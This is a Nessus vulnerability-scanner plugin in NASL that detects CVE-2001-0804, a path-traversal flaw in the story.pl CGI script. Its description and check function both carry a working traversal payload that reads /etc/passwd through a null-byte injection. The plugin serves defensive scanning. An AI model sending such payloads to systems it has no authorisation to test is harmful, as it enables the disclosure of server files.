#%NASL_MIN_LEVEL 70300
#
# This script was written by Georges Dagousset <georges.dagousset@alert4web.com>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - Revised plugin title (1/13/2009)
# - Updated to use compat.inc, added CVSS score (11/20/2009)

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10817);
  script_version("1.31");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2001-0804");
  script_bugtraq_id(3028);

  script_name(english:"Interactive Story story.pl next Parameter Traversal Arbitrary File Access");

  script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files on
the remote server.");
  script_set_attribute(attribute:"description", value:
"By requesting :

GET /cgi-bin/story.pl?next=../../../file_to_read%00

An attacker may use this flaw to read arbitrary files on
this server.");
  script_set_attribute(attribute:"solution", value:
"Upgrade story.pl to the latest version (1.4 or later).");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/07/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/12/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2001-2022 Alert4Web.com");

  script_dependencies("find_service1.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');

port = get_http_port(default:80, embedded:TRUE);

if(!get_port_state(port))exit(0);

function check(url)
{
 local_var buf, req;

 req = string(url, "?next=../../../../../etc/passwd%00");
 req = http_get(item:req, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if(buf == NULL)exit(0);
 if(egrep(pattern:"^HTTP/.* 404 .*", string:buf))return(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))
   {
    security_hole(port);
    exit(0);
   }
  
 if ( thorough_tests )
 {
  req = string(url, "?next=about");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);
  if (egrep(pattern:"This is version 1\.[0-3] of the story program", string:buf))
   {
    security_hole(port:port);
    exit(0);
   }
 }
}


foreach dir ( cgi_dirs() )
{
check(url:string(dir, "/story.pl"));
#check(url:string(dir, "/story/story.pl"));
}
